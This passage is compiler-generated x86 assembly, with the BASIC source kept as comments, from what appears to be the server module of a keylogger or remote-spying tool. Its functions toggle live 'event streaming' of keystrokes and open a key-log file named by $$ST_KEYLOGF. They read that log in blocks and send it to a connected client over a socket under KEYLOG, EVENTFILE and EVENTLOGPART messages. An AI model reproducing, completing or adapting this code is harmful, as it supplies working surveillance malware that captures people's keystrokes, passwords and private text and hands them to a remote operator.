;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody31.server:
;
; [2310] IFZ str$ THEN RETURN $$FALSE
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.334			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00E4.server			;;; i192
A.334:
	mov	eax,0			;;; i659
	jmp	end.func31.server			;;; i258
else.00E4.server:
end.if.00E4.server:
;
; [2311] switch$ = TRIM$(trim (str$,32))
#ifdef ClientStreamKeys.switch$
#undef ClientStreamKeys.switch$
#endif
#define ClientStreamKeys.switch$ ebp-40	; exposes local variable 'switch$'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk31.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	push	32			;;; i656a
	push	[ebp-48]			;;; i674a
	call	func12.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
	mov	d[esp],eax			;;; i887
	call	%_trim.d.s			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2313] IF switch$ == LCASE$("on") THEN
	sub	esp,64			;;; i487
	mov	eax,addr @_string.048F.server			;;; i663
	mov	d[esp],eax			;;; i887
	call	%_lcase.d.v			;;; i583
	add	esp,64			;;; i600
	mov	ebx,[ebp-40]			;;; i665
	call	%_string.compare.sv			;;; i690
	jne	>> else.00E5.server			;;; i219
;
; [2314] SendMsg (socket,"CMSG \1\2*** event streaming enabled ***")
	mov	eax,addr @_string.0496.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2315] #StreamKey = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[%#StreamKey.server],eax			;;; i668
;
; [2316] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func31.server			;;; i258
;
; [2317] END IF
else.00E5.server:
end.if.00E5.server:
;
; [2318] IF switch$ == LCASE$("off") THEN
	sub	esp,64			;;; i487
	mov	eax,addr @_string.0491.server			;;; i663
	mov	d[esp],eax			;;; i887
	call	%_lcase.d.v			;;; i583
	add	esp,64			;;; i600
	mov	ebx,[ebp-40]			;;; i665
	call	%_string.compare.sv			;;; i690
	jne	>> else.00E6.server			;;; i219
;
; [2319] IFT #StreamKey THEN
	mov	eax,d[%#StreamKey.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.00E7.server			;;; i221
;
; [2320] SendMsg (socket,"CMSG \1\2*** event streaming disabled ***")
	mov	eax,addr @_string.0498.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2321] END IF
else.00E7.server:
end.if.00E7.server:
;
; [2322] #StreamKey = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%#StreamKey.server],eax			;;; i668
;
; [2323] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func31.server			;;; i258
;
; [2324] END IF
else.00E6.server:
end.if.00E6.server:
;
; [2326] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func31.server			;;; i258
;
; [2327] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientStreamKeys.server:  ;;; Function end label for Assembly Programmers.
end.func31.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func31.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func31.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientStreamKeys ()  *****
;  *****
;
; [2329] FUNCTION STRING ConvertLFTo12 (msg$)
.code
;
#ifdef ConvertLFTo12.msg$
#undef ConvertLFTo12.msg$
#endif
#define ConvertLFTo12.msg$ ebp+8	; exposes function argument 'msg$'
;
align 16
_ConvertLFTo12.server@4:
;  *****
;  *****  FUNCTION  ConvertLFTo12 ()  *****
;  *****
func13.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody13.server:
;
; [2332] IFZ msg$ THEN RETURN ""
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.338			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00E8.server			;;; i192
A.338:
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func13.server			;;; i258
else.00E8.server:
end.if.00E8.server:
;
; [2334] FOR c = 0 TO LEN(msg$)
#ifdef ConvertLFTo12.c
#undef ConvertLFTo12.c
#endif
#define ConvertLFTo12.c ebp-40	; exposes local variable 'c'
;
	mov	eax,0			;;; i659
	mov	d[ebp-40],eax			;;; i670
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.339			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.339:
; .forlimit13.00E9 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
align 8
for.00E9.server:
	mov	eax,d[ebp-40]			;;; i665
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.00E9.server			;;; i154
;
; [2335] IF (msg${c} == 13) THEN
	mov	eax,d[ebp-40]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	cmp	eax,13			;;; i684a
	jne	>> else.00EA.server			;;; i219
;
; [2336] msg${c} = 1
	mov	eax,1			;;; i659
	mov	ebx,d[ebp-40]			;;; i665
	mov	ecx,d[ebp+8]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i29
;
; [2337] ELSE
	jmp	end.if.00EA.server			;;; i107
else.00EA.server:
;
; [2338] IF (msg${c} == 10) THEN msg${c} = 2
	mov	eax,d[ebp-40]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	cmp	eax,10			;;; i684a
	jne	>> else.00EB.server			;;; i219
	mov	eax,2			;;; i659
	mov	ebx,d[ebp-40]			;;; i665
	mov	ecx,d[ebp+8]			;;; i665
	lea	ebx,[ecx+ebx]			;;; i464
	mov	b[ebx],al			;;; i29
else.00EB.server:
end.if.00EB.server:
;
; [2339] END IF
end.if.00EA.server:
;
; [2340] NEXT c
do.next.00E9.server:
	inc	d[ebp-40]			;;; i229
	jmp	for.00E9.server			;;; i231
end.for.00E9.server:
;
; [2342] RETURN msg$
	mov	eax,[ebp+8]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func13.server			;;; i258
;
; [2343] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ConvertLFTo12.server:  ;;; Function end label for Assembly Programmers.
end.func13.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  ConvertLFTo12 ()  *****
;  *****
;
; [2345] FUNCTION ClientGetEventLog (socket)
.code
;
#ifdef ClientGetEventLog.socket
#undef ClientGetEventLog.socket
#endif
#define ClientGetEventLog.socket ebp+8	; exposes function argument 'socket'
;
align 16
_ClientGetEventLog.server@4:
;  *****
;  *****  FUNCTION  ClientGetEventLog ()  *****
;  *****
func2F.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func2F.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.346:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.346			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,180			;;; i114a
;
funcBody2F.server:
;
; [2346] SHARED of
;
; [2347] STRING text
#ifdef ClientGetEventLog.text
#undef ClientGetEventLog.text
#endif
#define ClientGetEventLog.text ebp-40	; exposes local variable 'text'
;
;
; [2350] IFZ of THEN of = OpenEventLog()
	mov	eax,d[%of.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.00EC.server			;;; i195
	call	func58.server			;;; i619
	mov	d[%of.server],eax			;;; i668
else.00EC.server:
end.if.00EC.server:
;
; [2351] IF of < 0 THEN
	mov	eax,d[%of.server]			;;; i663a
	cmp	eax,0			;;; i684a
	jge	>> else.00ED.server			;;; i219
;
; [2352] 'PRINT "unable to open event log: ",of
;
; [2353] of = 0
	mov	eax,0			;;; i659
	mov	d[%of.server],eax			;;; i668
;
; [2354] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func2F.server			;;; i258
;
; [2355] END IF
else.00ED.server:
end.if.00ED.server:
;
; [2357] filesize = LOF(of)
#ifdef ClientGetEventLog.filesize
#undef ClientGetEventLog.filesize
#endif
#define ClientGetEventLog.filesize ebp-44	; exposes local variable 'filesize'
;
	sub	esp,64			;;; i487
	mov	eax,d[%of.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_lof
	add	esp,64			;;; i600
	mov	d[ebp-44],eax			;;; i670
;
; [2359] IF filesize THEN
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00EE.server			;;; i221
;
; [2360] blk = 30000
#ifdef ClientGetEventLog.blk
#undef ClientGetEventLog.blk
#endif
#define ClientGetEventLog.blk ebp-48	; exposes local variable 'blk'
;
	mov	eax,30000			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [2361] total = 0
#ifdef ClientGetEventLog.total
#undef ClientGetEventLog.total
#endif
#define ClientGetEventLog.total ebp-52	; exposes local variable 'total'
;
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [2363] DO
align 8
do.00EF.server:
;
; [2364] IF filesize > blk THEN len = blk ELSE len = filesize
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jle	>> else.00F0.server			;;; i219
#ifdef ClientGetEventLog.len
#undef ClientGetEventLog.len
#endif
#define ClientGetEventLog.len ebp-56	; exposes local variable 'len'
;
	mov	eax,d[ebp-48]			;;; i665
	mov	d[ebp-56],eax			;;; i670
	jmp	end.if.00F0.server			;;; i107
else.00F0.server:
	mov	eax,d[ebp-44]			;;; i665
	mov	d[ebp-56],eax			;;; i670
end.if.00F0.server:
;
; [2366] text = SPACE$(len)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-56]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_space.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2367] SEEK (of,total)
	sub	esp,64			;;; i487
	mov	eax,d[%of.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-52]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_seek
	add	esp,64			;;; i600
;
; [2368] READ [of], text
	mov	eax,d[%of.server]			;;; i663a
; .filenumber = ebp-60	; internal variable
	mov	d[ebp-60],eax			;;; i670
	sub	esp,64			;;; i239
	mov	eax,d[ebp-60]			;;; i665
	mov	d[esp],eax			;;; i240
	mov	eax,d[ebp-40]			;;; i665
	mov	d[esp+4],eax			;;; i241
	call	%_ReadString			;;; i242
	add	esp,64			;;; i243
;
; [2369] SendMsg (socket,"EVENTLOGPART "+ConvertLFTo12(@text))
	push	[ebp-40]			;;; i674a
	call	func13.server			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[ebp-40],ecx			;;; i670
	mov	ebx,addr @_string.04A2.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2370] NetSleep (10)
	push	10			;;; i656a
	call	func51.server			;;; i619
;
; [2372] filesize = filesize - len
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-56]			;;; i665
	sub	eax,ebx			;;; i791
	mov	d[ebp-44],eax			;;; i670
;
; [2373] total = total + len
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,d[ebp-56]			;;; i665
	add	eax,ebx			;;; i775
	mov	d[ebp-52],eax			;;; i670
;
; [2374] LOOP WHILE (filesize > 0)
do.loop.00EF.server:
	mov	eax,d[ebp-44]			;;; i665
	cmp	eax,0			;;; i684a
	jg	< do.00EF.server			;;; i193
end.do.00EF.server:
;
; [2376] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func2F.server			;;; i258
;
; [2377] ELSE
	jmp	end.if.00EE.server			;;; i107
else.00EE.server:
;
; [2378] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func2F.server			;;; i258
;
; [2379] END IF
end.if.00EE.server:
;
; [2381] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientGetEventLog.server:  ;;; Function end label for Assembly Programmers.
end.func2F.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func2F.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func2F.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientGetEventLog ()  *****
;  *****
;
; [2383] FUNCTION ClientGetEventLogB (socket)
.code
;
#ifdef ClientGetEventLogB.socket
#undef ClientGetEventLogB.socket
#endif
#define ClientGetEventLogB.socket ebp+8	; exposes function argument 'socket'
;
align 16
_ClientGetEventLogB.server@4:
;  *****
;  *****  FUNCTION  ClientGetEventLogB ()  *****
;  *****
func30.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func30.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody30.server:
;
; [2384] SHARED of
;
; [2387] IFZ of THEN of = OpenEventLog()
	mov	eax,d[%of.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.00F1.server			;;; i195
	call	func58.server			;;; i619
	mov	d[%of.server],eax			;;; i668
else.00F1.server:
end.if.00F1.server:
;
; [2388] IF of < 0 THEN
	mov	eax,d[%of.server]			;;; i663a
	cmp	eax,0			;;; i684a
	jge	>> else.00F2.server			;;; i219
;
; [2389] 'PRINT "unable to open event log: ",of
;
; [2390] of = 0
	mov	eax,0			;;; i659
	mov	d[%of.server],eax			;;; i668
;
; [2391] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func30.server			;;; i258
;
; [2392] END IF
else.00F2.server:
end.if.00F2.server:
;
; [2394] fileSize = LOF(of)
#ifdef ClientGetEventLogB.fileSize
#undef ClientGetEventLogB.fileSize
#endif
#define ClientGetEventLogB.fileSize ebp-40	; exposes local variable 'fileSize'
;
	sub	esp,64			;;; i487
	mov	eax,d[%of.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_lof
	add	esp,64			;;; i600
	mov	d[ebp-40],eax			;;; i670
;
; [2395] IF fileSize THEN
	mov	eax,d[ebp-40]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.00F3.server			;;; i221
;
; [2396] log$ = NULL$(fileSize)
#ifdef ClientGetEventLogB.log$
#undef ClientGetEventLogB.log$
#endif
#define ClientGetEventLogB.log$ ebp-44	; exposes local variable 'log$'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_null.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2397] SEEK (of,0)
	sub	esp,64			;;; i487
	mov	eax,d[%of.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],0
	call	%_seek
	add	esp,64			;;; i600
;
; [2398] READ [of], log$
	mov	eax,d[%of.server]			;;; i663a
; .filenumber = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	sub	esp,64			;;; i239
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp],eax			;;; i240
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp+4],eax			;;; i241
	call	%_ReadString			;;; i242
	add	esp,64			;;; i243
;
; [2400] SendMsg (socket,"EVENTFILE "+ConvertLFTo12(@log$))
	push	[ebp-44]			;;; i674a
	call	func13.server			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[ebp-44],ecx			;;; i670
	mov	ebx,addr @_string.04A7.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2401] NetSleep (150)
	push	150			;;; i656a
	call	func51.server			;;; i619
;
; [2402] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func30.server			;;; i258
;
; [2403] ELSE
	jmp	end.if.00F3.server			;;; i107
else.00F3.server:
;
; [2404] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func30.server			;;; i258
;
; [2405] END IF
end.if.00F3.server:
;
; [2407] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientGetEventLogB.server:  ;;; Function end label for Assembly Programmers.
end.func30.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func30.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func30.server:
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientGetEventLogB ()  *****
;  *****
;
; [2409] FUNCTION OpenEventLog ()
.code
align 16
_OpenEventLog.server@0:
;  *****
;  *****  FUNCTION  OpenEventLog ()  *****
;  *****
func58.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody58.server:
;
; [2410] SHARED RECORDEVENTS
;
; [2413] IFF RECORDEVENTS THEN RETURN -1
	mov	eax,d[%RECORDEVENTS.server]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.00F4.server			;;; i195
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	jmp	end.func58.server			;;; i258
else.00F4.server:
end.if.00F4.server:
;
; [2414] IF WaitForSingleObject (#hSELF,15000) == $$WAIT_TIMEOUT THEN
	push	15000			;;; i656a
	push	[%#hSELF.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.00F5.server			;;; i219
;
; [2415] RETURN -1
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	jmp	end.func58.server			;;; i258
;
; [2416] END IF
else.00F5.server:
end.if.00F5.server:
;
; [2418] ifile = OPEN($$ST_KEYLOGF, $$RW)
#ifdef OpenEventLog.ifile
#undef OpenEventLog.ifile
#endif
#define OpenEventLog.ifile ebp-40	; exposes local variable 'ifile'
;
	sub	esp,64			;;; i487
	mov	eax,addr @_string.18E6.server			;;; i663
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],2
	call	%_open.v
	add	esp,64			;;; i600
	mov	d[ebp-40],eax			;;; i670
;
; [2419] ReleaseSemaphore (#hSELF,1,NULL)
#ifdef OpenEventLog.NULL
#undef OpenEventLog.NULL
#endif
#define OpenEventLog.NULL ebp-44	; exposes local variable 'NULL'
;
	push	[ebp-44]			;;; i674a
	push	1			;;; i656a
	push	[%#hSELF.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [2420] RETURN ifile
	mov	eax,d[ebp-40]			;;; i665
	jmp	end.func58.server			;;; i258
;
; [2421] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.OpenEventLog.server:  ;;; Function end label for Assembly Programmers.
end.func58.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  OpenEventLog ()  *****
;  *****
;
; [2423] FUNCTION ClientGetKeyLog (socket)
.code
;
#ifdef ClientGetKeyLog.socket
#undef ClientGetKeyLog.socket
#endif
#define ClientGetKeyLog.socket ebp+8	; exposes function argument 'socket'
;
align 16
_ClientGetKeyLog.server@4:
;  *****
;  *****  FUNCTION  ClientGetKeyLog ()  *****
;  *****
func2E.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody2E.server:
;
; [2426] SendMsg (socket,"KEYLOG "+GetEventLog())
	call	func5A.server			;;; i619
	mov	ebx,addr @_string.04B0.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2427] NetSleep (150)
	push	150			;;; i656a
	call	func51.server			;;; i619
;
; [2429] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func2E.server			;;; i258
;
; [2430] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientGetKeyLog.server:  ;;; Function end label for Assembly Programmers.
end.func2E.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  ClientGetKeyLog ()  *****
;  *****
;
; [2432] FUNCTION ClientStatus (socket)
.code
;
#ifdef ClientStatus.socket
#undef ClientStatus.socket
#endif
#define ClientStatus.socket ebp+8	; exposes function argument 'socket'
;
align 16
_ClientStatus.server@4:
;  *****
;  *****  FUNCTION  ClientStatus ()  *****
;  *****
func2D.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func2D.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.357:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.357			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
funcBody2D.server:
;
; [2433] SHARED XLONG tBytesSent,tBytesRecvA,tBytesRecvB
data section 'globals$shared'
align	4
%tBytesRecvA.server:	db 4 dup ?
.code
data section 'globals$shared'
align	4
%tBytesRecvB.server:	db 4 dup ?
.code
;
; [2434] SHARED XLONG startTick
;
; [2435] SHARED STRING atitle
;
; [2436] SHARED iconStatus
;
; [2437] XLONG mins
#ifdef ClientStatus.mins
#undef ClientStatus.mins
#endif
#define ClientStatus.mins ebp-40	; exposes local variable 'mins'
;
;
; [2438] SHARED of
;
; [2441] mins = ((GetTickCount()-startTick) * 0.001)/60
	call	_GetTickCount@0			;;; i619
	mov	ebx,d[%startTick.server]			;;; i663a
	sub	eax,ebx			;;; i791
	mov	d[ebp-8],eax			;;; i397
	fild	d[ebp-8]			;;; i398
	push	1062232653			;;; i650
	push	-755914244			;;; i651
	fld	q[esp]			;;; i652
	add	esp,8			;;; i653
	fmul				;;; i841
	mov	ebx,60			;;; i659
	mov	d[ebp-8],ebx			;;; i397
	fild	d[ebp-8]			;;; i398
	fdiv				;;; i841
	fistp	d[ebp-40]			;;; i645
;
; [2442] IFT #StreamKey THEN estatus$ = "enabled" ELSE estatus$ = "disabled"
	mov	eax,d[%#StreamKey.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.00F6.server			;;; i221
#ifdef ClientStatus.estatus$
#undef ClientStatus.estatus$
#endif
#define ClientStatus.estatus$ ebp-44	; exposes local variable 'estatus$'
;
	mov	eax,addr @_string.04BE.server			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
	jmp	end.if.00F6.server			;;; i107
else.00F6.server:
	mov	eax,addr @_string.04BF.server			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
end.if.00F6.server:
;
; [2443] IFT iconStatus THEN istatus$ = "enabled" ELSE istatus$ = "disabled"
	mov	eax,d[%iconStatus.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.00F7.server			;;; i221
#ifdef ClientStatus.istatus$
#undef ClientStatus.istatus$
#endif
#define ClientStatus.istatus$ ebp-48	; exposes local variable 'istatus$'
;
	mov	eax,addr @_string.04BE.server			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
